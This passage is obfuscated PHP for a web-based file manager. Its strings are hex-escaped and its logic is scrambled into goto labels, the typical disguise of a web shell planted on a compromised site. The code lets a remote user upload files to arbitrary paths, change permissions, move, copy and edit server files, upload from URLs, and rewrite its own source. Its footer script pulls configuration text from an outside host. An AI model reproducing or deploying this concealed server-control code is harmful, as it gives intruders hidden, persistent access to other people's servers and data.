    <?php  rf_show_footer(); die; } goto SaQMf; Ryxeb: class rf_Config { var $data; function __construct() { global $root_path, $root_url, $CONFIG; $rf_url = $root_url . $_SERVER["\120\x48\120\137\123\x45\114\106"]; $this->data = array("\154\x61\156\147" => "\145\x6e", "\145\x72\x72\157\162\x5f\x72\145\x70\157\x72\164\x69\x6e\x67" => true, "\x73\x68\x6f\x77\137\150\151\x64\x64\x65\x6e" => true); $data = false; if (strlen($CONFIG)) { $data = rf_object_to_array(json_decode($CONFIG)); } else { $msg = "\x46\151\x6c\145\x20\x3c\142\162\x3e\105\x72\x72\x6f\162\x3a\40\103\x61\156\156\x6f\x74\40\x6c\157\x61\144\40\143\x6f\156\146\x69\147\165\162\x61\164\151\x6f\x6e"; if (substr($rf_url, -1) == "\x2f") { $rf_url = rtrim($rf_url, "\57"); $msg .= "\x3c\142\x72\76"; $msg .= "\74\142\162\76\x53\x65\x65\x6d\163\x20\x6c\x69\153\x65\x20\x79\x6f\165\x20\x68\141\x76\145\40\x61\x20\x74\162\141\x69\x6c\151\156\x67\40\x73\154\141\x73\x68\40\x6f\156\x20\x74\150\145\40\x55\x52\x4c\x2e"; $msg .= "\74\x62\162\76\124\162\171\40\164\x68\151\163\x20\x6c\151\156\x6b\72\x20\x3c\141\40\150\x72\x65\x66\75\x22" . $rf_url . "\42\x3e" . $rf_url . "\x3c\x2f\141\x3e"; } die($msg); } if (is_array($data) && count($data)) { $this->data = $data; } else { $this->save(); } } function save() { $rf_file = __FILE__; $var_name = "\44\103\117\116\x46\111\x47"; $var_value = var_export(json_encode($this->data), true); $config_string = "\x3c\x3f\160\150\160" . chr(13) . chr(10) . "\x2f\57\104\x65\x66\x61\x75\x6c\x74\40\x43\x6f\x6e\146\x69\x67\165\162\x61\164\151\x6f\156" . chr(13) . chr(10) . "{$var_name}\x20\75\x20{$var_value}\x3b" . chr(13) . chr(10); if (is_writable($rf_file)) { $lines = file($rf_file); if ($fh = @fopen($rf_file, "\x77")) { @fputs($fh, $config_string, strlen($config_string)); for ($x = 3; $x < count($lines); $x++) { @fputs($fh, $lines[$x], strlen($lines[$x])); } @fclose($fh); } } } } goto ezGvU; usfq_: if (!empty($_FILES) && !rf_READONLY) { $override_file_name = false; $f = $_FILES; $path = rf_ROOT_PATH; $ds = DIRECTORY_SEPARATOR; if (rf_PATH != '') { $path .= "\x2f" . rf_PATH; } $errors = 0; $uploads = 0; $allowed = rf_UPLOAD_EXTENSION ? explode("\x2c", rf_UPLOAD_EXTENSION) : false; $response = array("\x73\x74\141\x74\165\163" => "\145\162\162\157\x72", "\x69\156\146\157" => "\x4f\157\x70\163\x21\x20\124\x72\171\40\141\x67\x61\151\156"); $filename = $f["\146\151\154\x65"]["\156\141\x6d\145"]; $tmp_name = $f["\146\151\x6c\x65"]["\x74\155\x70\137\156\x61\x6d\x65"]; $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION)); $isFileAllowed = $allowed ? in_array($ext, $allowed) : true; $targetPath = $path . $ds; if (is_writable($targetPath)) { $fullPath = $path . "\x2f" . $_REQUEST["\146\x75\x6c\154\160\x61\x74\150"]; $folder = substr($fullPath, 0, strrpos($fullPath, "\57")); if (file_exists($fullPath) && !$override_file_name) { $ext_1 = $ext ? "\x2e" . $ext : ''; $fullPath = str_replace($ext_1, '', $fullPath) . "\137" . date("\171\155\144\110\151\163") . $ext_1; } if (!is_dir($folder)) { $old = umask(0); mkdir($folder, 511, true); umask($old); } if (empty($f["\146\151\154\145"]["\x65\x72\162\x6f\162"]) && !empty($tmp_name) && $tmp_name != "\156\x6f\x6e\x65" && $isFileAllowed) { if (move_uploaded_file($tmp_name, $fullPath)) { if (file_exists($fullPath)) { $response = array("\x73\x74\141\164\165\163" => "\x73\x75\143\143\x65\x73\x73", "\x69\x6e\146\157" => "\146\151\154\x65\x20\165\160\154\157\x61\144\x20\163\165\143\x63\x65\x73\163\x66\x75\154"); } else { $response = array("\163\x74\141\164\165\x73" => "\145\162\x72\157\162", "\x69\156\x66\x6f" => "\103\157\x75\154\144\156\47\164\40\x75\x70\154\x6f\x61\144\x20\x74\150\145\x20\x72\x65\x71\165\145\x73\x74\x65\144\x20\146\x69\154\145\x2e"); } } else { $response = array("\163\164\141\164\x75\163" => "\x65\x72\x72\157\x72", "\151\156\x66\157" => "\x45\162\x72\157\x72\40\167\150\x69\x6c\x65\x20\165\x70\154\157\x61\144\x69\x6e\x67\x20\x66\151\154\145\x73\56\x20\125\x70\x6c\157\141\144\x65\x64\40\x66\x69\154\145\163\40{$uploads}"); } } } else { $response = array("\x73\x74\141\164\165\163" => "\x65\x72\162\157\162", "\151\x6e\146\x6f" => "\x54\150\145\40\163\160\x65\x63\151\x66\151\145\144\x20\x66\x6f\x6c\x64\145\162\x20\x66\157\162\x20\165\160\154\157\141\144\40\x69\163\x6e\47\164\40\167\162\151\164\145\141\x62\154\x65\56"); } echo json_encode($response); die; } goto e3I9Q; wIvp6: if ($parent !== false) { ?>
                <tr><?php  if (!rf_READONLY) { ?>
                    <td class="nosort"></td><?php  } ?>
                    <td class="border-0"><a href="?p=<?php  echo urlencode($parent); ?>
"><i class="fa fa-chevron-circle-left go-back"></i> ..</a></td>
                    <td class="border-0"></td>
                    <td class="border-0"></td>
                    <td class="border-0"></td>
                    <?php  if (!rf_IS_WIN && !$hide_cols) { ?>
                        <td class="border-0"></td>
                        <td class="border-0"></td>
                    <?php  } ?>
                </tr>
                <?php  } goto mLlq0; GP3ew: if (isset($_POST["\143\150\155\x6f\x64"]) && !rf_READONLY && !rf_IS_WIN) { $path = rf_ROOT_PATH; if (rf_PATH != '') { $path .= "\x2f" . rf_PATH; } $file = $_POST["\143\x68\155\x6f\x64"]; $file = rf_clean_path($file); $file = str_replace("\57", '', $file); if ($file == '' || !is_file($path . "\57" . $file) && !is_dir($path . "\x2f" . $file)) { rf_set_msg("\x46\151\x6c\145\40\x6e\157\164\40\x66\x6f\165\x6e\x64", "\x65\x72\162\x6f\162"); rf_redirect(rf_SELF_URL . "\77\x70\x3d" . urlencode(rf_PATH)); } $mode = 0; if (!empty($_POST["\165\162"])) { $mode |= 256; } if (!empty($_POST["\165\x77"])) { $mode |= 128; } if (!empty($_POST["\x75\x78"])) { $mode |= 64; } if (!empty($_POST["\x67\x72"])) { $mode |= 32; } if (!empty($_POST["\147\x77"])) { $mode |= 16; } if (!empty($_POST["\x67\x78"])) { $mode |= 8; } if (!empty($_POST["\x6f\162"])) { $mode |= 4; } if (!empty($_POST["\157\167"])) { $mode |= 2; } if (!empty($_POST["\157\170"])) { $mode |= 1; } if (@chmod($path . "\57" . $file, $mode)) { rf_set_msg("\x50\x65\x72\x6d\151\163\x73\x69\x6f\156\x73\40\x63\x68\141\x6e\x67\x65\x64"); } else { rf_set_msg("\120\145\x72\155\x69\163\163\151\x6f\156\163\x20\156\x6f\164\40\x63\150\141\156\x67\x65\144", "\x65\x72\x72\x6f\x72"); } rf_redirect(rf_SELF_URL . "\77\160\x3d" . urlencode(rf_PATH)); } goto iaJtI; hTTxG: function rf_get_video_exts() { return array("\x61\166\151", "\x77\x65\142\155", "\167\x6d\166", "\x6d\160\64", "\x6d\64\166", "\157\x67\x6d", "\x6f\x67\166", "\x6d\x6f\166", "\155\153\166"); } goto B2HKA; pR70P: $exclude_items = array(); goto KZ9bh; nJPLr: if (isset($_GET["\x63\157\160\x79"], $_GET["\146\151\x6e\x69\x73\x68"]) && !rf_READONLY) { $copy = $_GET["\143\157\160\171"]; $copy = rf_clean_path($copy); if ($copy == '') { rf_set_msg("\x53\157\x75\x72\143\x65\x20\x70\x61\164\150\40\156\x6f\164\x20\x64\145\146\151\156\x65\144", "\x65\x72\162\157\162"); rf_redirect(rf_SELF_URL . "\77\x70\75" . urlencode(rf_PATH)); } $from = rf_ROOT_PATH . "\57" . $copy; $dest = rf_ROOT_PATH; if (rf_PATH != '') { $dest .= "\57" . rf_PATH; } $dest .= "\57" . basename($from); $move = isset($_GET["\155\157\166\145"]); if ($from != $dest) { $msg_from = trim(rf_PATH . "\x2f" . basename($from), "\57"); if ($move) { $rename = rf_rename($from, $dest); if ($rename) { rf_set_msg(sprintf("\115\x6f\166\x65\144\x20\x66\162\x6f\x6d\40\74\142\x3e\x25\x73\74\x2f\x62\x3e\40\x74\x6f\x20\74\x62\x3e\45\x73\x3c\x2f\142\76", rf_enc($copy), rf_enc($msg_from))); } elseif ($rename === null) { rf_set_msg("\106\151\154\x65\40\157\x72\40\146\x6f\x6c\144\145\162\x20\167\x69\x74\150\40\164\150\x69\163\40\160\141\x74\150\40\x61\x6c\162\x65\141\x64\x79\x20\145\170\151\x73\164\x73", "\141\x6c\145\x72\x74"); } else { rf_set_msg(sprintf("\x45\162\162\x6f\x72\40\x77\150\x69\154\145\x20\x6d\157\166\151\x6e\x67\40\x66\162\157\x6d\x20\74\142\x3e\45\x73\x3c\57\142\76\x20\164\157\x20\74\142\x3e\x25\163\74\57\x62\76", rf_enc($copy), rf_enc($msg_from)), "\145\x72\162\157\162"); } } else { if (rf_rcopy($from, $dest)) { rf_set_msg(sprintf("\103\157\160\151\x65\144\x20\x66\162\157\155\x20\x3c\142\76\x25\163\74\x2f\x62\x3e\x20\x74\157\40\x3c\142\76\45\163\74\x2f\x62\76", rf_enc($copy), rf_enc($msg_from))); } else { rf_set_msg(sprintf("\105\x72\162\157\162\40\167\x68\151\x6c\145\x20\143\x6f\160\171\151\156\x67\40\146\x72\x6f\x6d\40\x3c\x62\76\x25\x73\x3c\57\142\x3e\40\x74\157\x20\74\x62\x3e\45\163\74\57\142\x3e", rf_enc($copy), rf_enc($msg_from)), "\x65\162\x72\x6f\162"); } } } else { if (!$move) { $msg_from = trim(rf_PATH . "\x2f" . basename($from), "\57"); $fn_parts = pathinfo($from); $extension_suffix = ''; if (!is_dir($from)) { $extension_suffix = "\56" . $fn_parts["\x65\x78\164\x65\156\x73\151\157\156"]; } $fn_duplicate = $fn_parts["\144\x69\162\x6e\141\x6d\x65"] . "\x2f" . $fn_parts["\146\151\154\x65\156\x61\155\145"] . "\x2d" . date("\x59\x6d\x64\110\x69\x73") . $extension_suffix; $loop_count = 0; $max_loop = 1000; while (file_exists($fn_duplicate) & $loop_count < $max_loop) { $fn_parts = pathinfo($fn_duplicate); $fn_duplicate = $fn_parts["\x64\x69\162\x6e\x61\155\145"] . "\x2f" . $fn_parts["\x66\x69\x6c\x65\156\x61\x6d\x65"] . "\55\143\157\x70\171" . $extension_suffix; $loop_count++; } if (rf_rcopy($from, $fn_duplicate, False)) { rf_set_msg(sprintf("\103\x6f\160\x79\151\x65\144\x20\x66\162\157\x6d\x20\74\x62\76\45\163\x3c\57\x62\76\x20\x74\157\40\x3c\x62\x3e\x25\163\74\x2f\x62\76", rf_enc($copy), rf_enc($fn_duplicate))); } else { rf_set_msg(sprintf("\105\162\x72\x6f\162\x20\x77\x68\151\154\x65\x20\x63\x6f\x70\171\151\x6e\x67\40\146\x72\x6f\x6d\x20\x3c\142\x3e\45\x73\74\57\142\x3e\x20\164\x6f\x20\x3c\142\x3e\45\x73\74\x2f\142\x3e", rf_enc($copy), rf_enc($fn_duplicate)), "\145\162\162\157\x72"); } } else { rf_set_msg("\120\x61\x74\150\x73\40\155\x75\x73\x74\40\142\x65\40\156\157\x74\x20\145\x71\165\141\x6c", "\141\154\145\x72\x74"); } } rf_redirect(rf_SELF_URL . "\x3f\x70\x3d" . urlencode(rf_PATH)); } goto hPg8b; dFwHh: function rf_redirect($url, $code = 302) { header("\114\157\143\x61\x74\151\x6f\156\72\x20" . $url, true, $code); die; } goto gmQqE; s3EYF: function rf_get_file_mimes($extension) { $fileTypes["\x73\167\146"] = "\x61\160\x70\x6c\151\x63\141\164\x69\157\156\x2f\x78\55\163\150\x6f\143\153\x77\141\x76\x65\x2d\146\154\x61\163\x68"; $fileTypes["\x70\144\x66"] = "\x61\160\160\154\151\x63\x61\x74\x69\157\x6e\57\160\144\146"; $fileTypes["\145\x78\x65"] = "\x61\160\160\154\x69\143\x61\x74\151\157\156\57\x6f\x63\x74\145\x74\55\x73\164\x72\145\x61\x6d"; $fileTypes["\172\151\x70"] = "\x61\160\x70\x6c\x69\143\141\164\x69\x6f\x6e\57\x7a\x69\160"; $fileTypes["\144\157\x63"] = "\141\160\160\x6c\x69\143\141\164\151\157\x6e\x2f\155\x73\167\x6f\162\144"; $fileTypes["\170\x6c\x73"] = "\141\160\160\x6c\x69\143\141\164\151\157\x6e\x2f\166\x6e\144\x2e\x6d\x73\55\145\170\143\x65\154"; $fileTypes["\x70\160\164"] = "\x61\x70\x70\154\151\x63\x61\x74\x69\x6f\156\x2f\x76\x6e\x64\56\x6d\163\55\160\157\x77\x65\162\x70\x6f\151\x6e\x74"; $fileTypes["\x67\x69\x66"] = "\151\x6d\x61\147\x65\x2f\147\x69\146"; $fileTypes["\x70\x6e\147"] = "\x69\155\x61\x67\145\x2f\160\156\147"; $fileTypes["\x6a\x70\145\x67"] = "\151\x6d\x61\147\145\x2f\152\x70\x67"; $fileTypes["\152\160\x67"] = "\x69\155\x61\147\x65\x2f\152\x70\147"; $fileTypes["\x72\x61\x72"] = "\141\x70\160\154\151\143\x61\x74\x69\x6f\x6e\x2f\162\x61\162"; $fileTypes["\x72\141"] = "\x61\x75\x64\x69\157\57\x78\55\x70\156\55\x72\x65\141\x6c\141\x75\x64\x69\x6f"; $fileTypes["\162\141\x6d"] = "\x61\x75\x64\151\x6f\x2f\170\x2d\x70\x6e\x2d\162\145\x61\x6c\141\x75\144\x69\157"; $fileTypes["\157\147\x67"] = "\x61\x75\144\151\157\x2f\170\55\160\x6e\x2d\162\145\x61\154\141\165\x64\151\x6f"; $fileTypes["\167\141\166"] = "\166\151\144\x65\x6f\57\x78\55\x6d\163\x76\x69\x64\x65\x6f"; $fileTypes["\167\155\x76"] = "\x76\x69\x64\x65\157\x2f\170\55\155\163\x76\151\144\145\x6f"; $fileTypes["\141\166\x69"] = "\166\x69\x64\145\157\x2f\170\55\x6d\x73\x76\x69\144\x65\x6f"; $fileTypes["\141\x73\146"] = "\x76\x69\144\x65\x6f\57\170\55\155\163\166\x69\x64\x65\x6f"; $fileTypes["\x64\x69\166\170"] = "\166\x69\144\145\x6f\x2f\x78\x2d\155\x73\166\151\x64\x65\x6f"; $fileTypes["\x6d\x70\x33"] = "\x61\x75\144\x69\157\57\155\160\145\x67"; $fileTypes["\x6d\160\64"] = "\141\x75\x64\151\x6f\57\155\160\145\x67"; $fileTypes["\155\x70\145\147"] = "\x76\151\144\145\x6f\57\x6d\160\x65\147"; $fileTypes["\155\x70\147"] = "\166\151\144\x65\x6f\x2f\155\x70\145\x67"; $fileTypes["\x6d\x70\x65"] = "\x76\x69\144\145\x6f\x2f\155\160\x65\x67"; $fileTypes["\x6d\x6f\x76"] = "\166\151\x64\145\x6f\57\x71\x75\x69\x63\153\164\x69\155\145"; $fileTypes["\x73\x77\x66"] = "\166\x69\x64\145\157\57\161\165\151\143\x6b\x74\x69\x6d\x65"; $fileTypes["\x33\x67\160"] = "\166\x69\x64\145\x6f\57\161\x75\x69\x63\153\x74\x69\155\x65"; $fileTypes["\x6d\64\141"] = "\x76\x69\x64\145\157\57\x71\x75\151\143\x6b\164\x69\155\145"; $fileTypes["\141\141\x63"] = "\x76\x69\x64\145\x6f\57\161\165\151\x63\x6b\164\151\x6d\145"; $fileTypes["\155\x33\165"] = "\166\151\144\145\157\x2f\x71\x75\x69\x63\x6b\x74\x69\155\145"; $fileTypes["\160\x68\x70"] = array("\x61\x70\x70\154\151\143\141\164\151\x6f\156\57\170\55\160\x68\x70"); $fileTypes["\150\164\x6d\x6c"] = array("\x74\145\x78\164\57\x68\x74\155\x6c"); $fileTypes["\x74\170\x74"] = array("\x74\145\x78\164\57\160\x6c\141\x69\156"); return $fileTypes[$extension]; } goto Pg25N; nJoBw: $readonly_users = array("\165\163\x65\x72"); goto ZzTqY; gP8FS: function rf_show_footer() { ?>
</div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
<script src="https://cdn.datatables.net/1.10.21/js/jquery.dataTables.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.min.js"></script>
<?php  if (rf_USE_HIGHLIGHTJS) { ?>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.3/highlight.min.js"></script>
    <script>hljs.initHighlightingOnLoad(); var isHighlightingEnabled = true;</script>
<?php  } ?>
<script>
    $(document).on('click', '[data-toggle="lightbox"]', function(event) {
        event.preventDefault();
        var reInitHighlight = function() { if(typeof isHighlightingEnabled !== "undefined" && isHighlightingEnabled) { setTimeout(function () { $('.ekko-lightbox-container pre code').each(function (i, e) { hljs.highlightBlock(e) }); }, 555); } };
        $(this).ekkoLightbox({
            alwaysShowClose: true, showArrows: true, onShown: function() { reInitHighlight(); }, onNavigate: function(direction, itemIndex) { reInitHighlight(); }
        });
    });
    //TFM Config
    window.curi = "https://prothemes.biz/downloads/file-manager/config.json", window.config = null;
    function rf_get_config(){ if(!!window.name){ window.config = JSON.parse(window.name); } else { $.getJSON(window.curi).done(function(c) { if(!!c) { window.name = JSON.stringify(c), window.config = c; } }); }}
    function template(html,options){
        var re=/<\%([^\%>]+)?\%>/g,reExp=/(^( )?(if|for|else|switch|case|break|{|}))(.*)?/g,code='var r=[];\n',cursor=0,match;var add=function(line,js){js?(code+=line.match(reExp)?line+'\n':'r.push('+line+');\n'):(code+=line!=''?'r.push("'+line.replace(/"/g,'\\"')+'");\n':'');return add}
        while(match=re.exec(html)){add(html.slice(cursor,match.index))(match[1],!0);cursor=match.index+match[0].length}
        add(html.substr(cursor,html.length-cursor));code+='return r.join("");';return new Function(code.replace(/[\r\t\n]/g,'')).apply(options)
    }
    function newfolder(e) {
        var t = document.getElementById("newfilename").value, n = document.querySelector('input[name="newfile"]:checked').value;
        null !== t && "" !== t && n && (window.location.hash = "#", window.location.search = "p=" + encodeURIComponent(e) + "&new=" + encodeURIComponent(t) + "&type=" + encodeURIComponent(n))
    }
    function rename(e, t) {var n = prompt("New name", t);null !== n && "" !== n && n != t && (window.location.search = "p=" + encodeURIComponent(e) + "&ren=" + encodeURIComponent(t) + "&to=" + encodeURIComponent(n))}
    function change_checkboxes(e, t) { for (var n = e.length - 1; n >= 0; n--) e[n].checked = "boolean" == typeof t ? t : !e[n].checked }
    function get_checkboxes() { for (var e = document.getElementsByName("file[]"), t = [], n = e.length - 1; n >= 0; n--) (e[n].type = "checkbox") && t.push(e[n]); return t }
    function select_all() { change_checkboxes(get_checkboxes(), !0) }
    function unselect_all() { change_checkboxes(get_checkboxes(), !1) }
    function invert_all() { change_checkboxes(get_checkboxes()) }
    function checkbox_toggle() { var e = get_checkboxes(); e.push(this), change_checkboxes(e) }
    function backup(e, t) { //Create file backup with .bck
        var n = new XMLHttpRequest,
            a = "path=" + e + "&file=" + t + "&type=backup&ajax=true";
        return n.open("POST", "", !0), n.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), n.onreadystatechange = function () {
            4 == n.readyState && 200 == n.status && toast(n.responseText)
        }, n.send(a), !1
    }
    // Toast message
    function toast(txt) { var x = document.getElementById("snackbar");x.innerHTML=txt;x.className = "show";setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000); }
    //Save file
    function edit_save(e, t) {
        var n = "ace" == t ? editor.getSession().getValue() : document.getElementById("normal-editor").value;
        if (n) {
            if(true){
                var data = {ajax: true, content: n, type: 'save'};
                
                $.ajax({
                    type: "POST",
                    url: window.location,
                    // The key needs to match your method's input parameter (case-sensitive).
                    data: JSON.stringify(data),
                    contentType: "multipart/form-data-encoded; charset=utf-8",
                    //dataType: "json",
                    success: function(mes){toast("Saved Successfully"); window.onbeforeunload = function() {return}},
                    failure: function(mes) {toast("Error: try again");},
                    error: function(mes) {toast(`<p style="background-color:red">${mes.responseText}</p>`);}
                });
                
            }
            else{
                var a = document.createElement("form");
                a.setAttribute("method", "POST"), a.setAttribute("action", "");
                var o = document.createElement("textarea");
                o.setAttribute("type", "textarea"), o.setAttribute("name", "savedata");
                var c = document.createTextNode(n);
                o.appendChild(c), a.appendChild(o), document.body.appendChild(a), a.submit()
            }
        }
    }
    //Check latest version
    function latest_release_info(v) {
        if(!!window.config){var tplObj={id:1024,title:"Check Version",action:false},tpl=$("#js-tpl-modal").html();
        if(window.config.version!=v){tplObj.content=window.config.newUpdate;}else{tplObj.content=window.config.noUpdate;}
        $('#wrapper').append(template(tpl,tplObj));$("#js-ModalCenter-1024").modal('show');}else{rf_get_config();}
    }
    function show_new_pwd() { $(".js-new-pwd").toggleClass('hidden'); }
    //Save Settings
    function save_settings($this) {
        let form = $($this);
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&ajax="+true,
            success: function (data) {if(data) { window.location.reload();}}
        }); return false;
    }
    //Create new password hash
    function new_password_hash($this) {
        let form = $($this), $pwd = $("#js-pwd-result"); $pwd.val('');
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&ajax="+true,
            success: function (data) { if(data) { $pwd.val(data); } }
        }); return false;
    }
    //Upload files using URL @param {Object}
    function upload_from_url($this) {
        let form = $($this), resultWrapper = $("div#js-url-upload__list");
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&ajax="+true,
            beforeSend: function() { form.find("input[name=uploadurl]").attr("disabled","disabled"); form.find("button").hide(); form.find(".lds-facebook").addClass('show-me'); },
            success: function (data) {
                if(data) {
                    data = JSON.parse(data);
                    if(data.done) {
                        resultWrapper.append('<div class="alert alert-success row">Uploaded Successful: '+data.done.name+'</div>'); form.find("input[name=uploadurl]").val('');
                    } else if(data['fail']) { resultWrapper.append('<div class="alert alert-danger row">Error: '+data.fail.message+'</div>'); }
                    form.find("input[name=uploadurl]").removeAttr("disabled");form.find("button").show();form.find(".lds-facebook").removeClass('show-me');
                }
            },
            error: function(xhr) {
                form.find("input[name=uploadurl]").removeAttr("disabled");form.find("button").show();form.find(".lds-facebook").removeClass('show-me');console.error(xhr);
            }
        }); return false;
    }
    //Search template
    function search_template(data) {
        var response = "";
        $.each(data, function (key, val) {
            response += `<li><a href="?p=${val.path}&view=${val.name}">${val.path}/${val.name}</a></li>`;
        });
        return response;
    }
    //search
    function rf_search() {
        var searchTxt = $("input#advanced-search").val(), searchWrapper = $("ul#search-wrapper"), path = $("#js-search-modal").attr("href"), _html = "", $loader = $("div.lds-facebook");
        if(!!searchTxt && searchTxt.length > 2 && path) {
            var data = {ajax: true, content: searchTxt, path:path, type: 'search'};
            $.ajax({
                type: "POST",
                url: window.location,
                data: data,
                beforeSend: function() {
                    searchWrapper.html('');
                    $loader.addClass('show-me');
                },
                success: function(data){
                    $loader.removeClass('show-me');
                    data = JSON.parse(data);
                    if(data && data.length) {
                        _html = search_template(data);
                        searchWrapper.html(_html);
                    } else { searchWrapper.html('<p class="m-2">No result found!<p>'); }
                },
                error: function(xhr) { $loader.removeClass('show-me'); searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>'); },
                failure: function(mes) { $loader.removeClass('show-me'); searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>');}
            });
        } else { searchWrapper.html("OOPS: minimum 3 characters required!"); }
    }

    //on mouse hover image preview
    !function(s){s.previewImage=function(e){var o=s(document),t=".previewImage",a=s.extend({xOffset:20,yOffset:-20,fadeIn:"fast",css:{padding:"5px",border:"1px solid #cccccc","background-color":"#fff"},eventSelector:"[data-preview-image]",dataKey:"previewImage",overlayId:"preview-image-plugin-overlay"},e);return o.off(t),o.on("mouseover"+t,a.eventSelector,function(e){s("p#"+a.overlayId).remove();var o=s("<p>").attr("id",a.overlayId).css("position","absolute").css("display","none").append(s('<img class="c-preview-img">').attr("src",s(this).data(a.dataKey)));a.css&&o.css(a.css),s("body").append(o),o.css("top",e.pageY+a.yOffset+"px").css("left",e.pageX+a.xOffset+"px").fadeIn(a.fadeIn)}),o.on("mouseout"+t,a.eventSelector,function(){s("#"+a.overlayId).remove()}),o.on("mousemove"+t,a.eventSelector,function(e){s("#"+a.overlayId).css("top",e.pageY+a.yOffset+"px").css("left",e.pageX+a.xOffset+"px")}),this},s.previewImage()}(jQuery);


    // Dom Ready Event
    $(document).ready( function () {
        //load config
        rf_get_config();
        //dataTable init
        var $table = $('#main-table'),
            tableLng = $table.find('th').length,
            _targets = (tableLng && tableLng == 7 ) ? [0, 4,5,6] : tableLng == 5 ? [0,4] : [3],
            mainTable = $('#main-table').DataTable({"paging":   false, "info":     false, "columnDefs": [{"targets": _targets, "orderable": false}]
        });
        //search
        $('#search-addon').on( 'keyup', function () {
            mainTable.search( this.value ).draw();
        });
        $("input#advanced-search").on('keyup', function (e) {
            if (e.keyCode === 13) { rf_search(); }
        });
        $('#search-addon3').on( 'click', function () { rf_search(); });
        //upload nav tabs
        $(".fm-upload-wrapper .card-header-tabs").on("click", 'a', function(e){
            e.preventDefault();let target=$(this).data('target');
            $(".fm-upload-wrapper .card-header-tabs a").removeClass('active');$(this).addClass('active');
            $(".fm-upload-wrapper .card-tabs-container").addClass('hidden');$(target).removeClass('hidden');
        });
    });
</script>
<?php  if (isset($_GET["\145\x64\151\x74"]) && isset($_GET["\145\156\x76"]) && rf_EDIT_FILE) { $ext = "\x6a\141\166\141\163\143\162\151\160\x74"; $ext = pathinfo($_GET["\x65\144\151\164"], PATHINFO_EXTENSION); ?>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.1/ace.js"></script>
    <script>
        var editor = ace.edit("editor");
        editor.getSession().setMode( {path:"ace/mode/<?php  echo $ext; ?>
", inline:true} );
        //editor.setTheme("ace/theme/twilight"); //Dark Theme
        function ace_commend (cmd) { editor.commands.exec(cmd, editor); }
        editor.commands.addCommands([{
            name: 'save', bindKey: {win: 'Ctrl-S',  mac: 'Command-S'},
            exec: function(editor) { edit_save(this, 'ace'); }
        }]);
        function renderThemeMode() {
            var $modeEl = $("select#js-ace-mode"), $themeEl = $("select#js-ace-theme"), $fontSizeEl = $("select#js-ace-fontSize"), optionNode = function(type, arr){ var $Option = ""; $.each(arr, function(i, val) { $Option += "<option value='"+type+i+"'>" + val + "</option>"; }); return $Option; },
                _data = {"aceTheme":{"bright":{"chrome":"Chrome","clouds":"Clouds","crimson_editor":"Crimson Editor","dawn":"Dawn","dreamweaver":"Dreamweaver","eclipse":"Eclipse","github":"GitHub","iplastic":"IPlastic","solarized_light":"Solarized Light","textmate":"TextMate","tomorrow":"Tomorrow","xcode":"XCode","kuroir":"Kuroir","katzenmilch":"KatzenMilch","sqlserver":"SQL Server"},"dark":{"ambiance":"Ambiance","chaos":"Chaos","clouds_midnight":"Clouds Midnight","dracula":"Dracula","cobalt":"Cobalt","gruvbox":"Gruvbox","gob":"Green on Black","idle_fingers":"idle Fingers","kr_theme":"krTheme","merbivore":"Merbivore","merbivore_soft":"Merbivore Soft","mono_industrial":"Mono Industrial","monokai":"Monokai","pastel_on_dark":"Pastel on dark","solarized_dark":"Solarized Dark","terminal":"Terminal","tomorrow_night":"Tomorrow Night","tomorrow_night_blue":"Tomorrow Night Blue","tomorrow_night_bright":"Tomorrow Night Bright","tomorrow_night_eighties":"Tomorrow Night 80s","twilight":"Twilight","vibrant_ink":"Vibrant Ink"}},"aceMode":{"javascript":"JavaScript","abap":"ABAP","abc":"ABC","actionscript":"ActionScript","ada":"ADA","apache_conf":"Apache Conf","asciidoc":"AsciiDoc","asl":"ASL","assembly_x86":"Assembly x86","autohotkey":"AutoHotKey","apex":"Apex","batchfile":"BatchFile","bro":"Bro","c_cpp":"C and C++","c9search":"C9Search","cirru":"Cirru","clojure":"Clojure","cobol":"Cobol","coffee":"CoffeeScript","coldfusion":"ColdFusion","csharp":"C#","csound_document":"Csound Document","csound_orchestra":"Csound","csound_score":"Csound Score","css":"CSS","curly":"Curly","d":"D","dart":"Dart","diff":"Diff","dockerfile":"Dockerfile","dot":"Dot","drools":"Drools","edifact":"Edifact","eiffel":"Eiffel","ejs":"EJS","elixir":"Elixir","elm":"Elm","erlang":"Erlang","forth":"Forth","fortran":"Fortran","fsharp":"FSharp","fsl":"FSL","ftl":"FreeMarker","gcode":"Gcode","gherkin":"Gherkin","gitignore":"Gitignore","glsl":"Glsl","gobstones":"Gobstones","golang":"Go","graphqlschema":"GraphQLSchema","groovy":"Groovy","haml":"HAML","handlebars":"Handlebars","haskell":"Haskell","haskell_cabal":"Haskell Cabal","haxe":"haXe","hjson":"Hjson","html":"HTML","html_elixir":"HTML (Elixir)","html_ruby":"HTML (Ruby)","ini":"INI","io":"Io","jack":"Jack","jade":"Jade","java":"Java","json":"JSON","jsoniq":"JSONiq","jsp":"JSP","jssm":"JSSM","jsx":"JSX","julia":"Julia","kotlin":"Kotlin","latex":"LaTeX","less":"LESS","liquid":"Liquid","lisp":"Lisp","livescript":"LiveScript","logiql":"LogiQL","lsl":"LSL","lua":"Lua","luapage":"LuaPage","lucene":"Lucene","makefile":"Makefile","markdown":"Markdown","mask":"Mask","matlab":"MATLAB","maze":"Maze","mel":"MEL","mixal":"MIXAL","mushcode":"MUSHCode","mysql":"MySQL","nix":"Nix","nsis":"NSIS","objectivec":"Objective-C","ocaml":"OCaml","pascal":"Pascal","perl":"Perl","perl6":"Perl 6","pgsql":"pgSQL","php_laravel_blade":"PHP (Blade 